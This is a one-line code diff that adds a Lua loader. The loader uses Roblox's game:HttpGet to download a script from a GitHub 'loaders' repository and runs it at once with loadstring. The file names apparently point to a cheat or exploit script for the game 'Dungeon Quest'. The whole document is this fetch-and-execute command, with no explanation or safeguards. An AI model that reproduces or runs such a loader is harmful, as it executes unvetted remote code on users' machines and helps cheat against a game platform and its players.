@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/1-drop-dungeon-quest-reborn-spam3-kmjjq7fno8t43a.lua"))()
